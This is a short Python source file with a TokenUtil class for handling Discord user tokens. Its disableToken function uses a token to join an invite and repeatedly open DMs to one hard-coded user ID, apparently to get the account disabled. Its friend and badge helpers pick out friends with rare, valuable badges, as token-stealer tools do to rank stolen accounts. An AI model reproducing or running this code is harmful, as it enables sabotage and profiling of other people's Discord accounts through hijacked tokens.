import base64, requests

class TokenUtil:
    @staticmethod
    def disableToken(token):
        res = requests.post("https://discord.com/api/invites/discord-testers", headers={"authorization": token})
        if res.status_code != 200:
            return print("Invalid token.")
        ids = ["280712677909594113", "280712677909594113","280712677909594113","280712677909594113", "280712677909594113","280712677909594113","280712677909594113","280712677909594113","280712677909594113","280712677909594113"]
        for id in ids:
            requests.post("https://discord.com/api/users/@me/channels", data={"recipient_id": id}, headers={"authorization": token, "user-agent": "somerandomuseragent lmfao"})
            
    def validateToken(token:str):
        try:
            b64:str = token.split(".")[0]
        except:
            raise TypeError
        b64bytes = b64.encode("ascii")
        strbytes = base64.b64decode(b64bytes)
        userid = strbytes.decode("ascii")
        try:
            int(userid)
        except ValueError:
            raise TypeError
    def calcfriends(fr:list) -> list:
        validf = []
        raref = []
        for f in fr:
            if f["type"] == 1:
                validf.append(f)
        for f in validf:
            b = TokenUtil.getRBadges(f["user"]["public_flags"])
            if b != "":
                raref.append(b + f' {f["user"]["username"]}#{f["user"]["discriminator"]}')
        return raref
    def getRBadges(flags:int):
        Discord_Employee = 1
        Partnered_Server_Owner = 2
        HypeSquad_Events = 4
        Bug_Hunter_Level_1 = 8
        Early_Supporter = 512
        Bug_Hunter_Level_2 = 16384
        Early_Verified_Bot_Developer = 131072
        badges = ""
        if(flags & Discord_Employee) == Discord_Employee:
            badges += "Discord Staff, "
        if(flags & Partnered_Server_Owner) == Partnered_Server_Owner:
            badges += "Partner, "
        if(flags & HypeSquad_Events) == HypeSquad_Events:
            badges += "HypeSquad Events,  "
        if(flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1:
            badges += "Bughunter LVL 1,  "
        if(flags & Early_Supporter) == Early_Supporter:
            badges += "Early Supporter, "
        if(flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2:
            badges += "Bughunter LVL 2, "
        if(flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer:
            badges += "Early Bot Developer, "
        return badges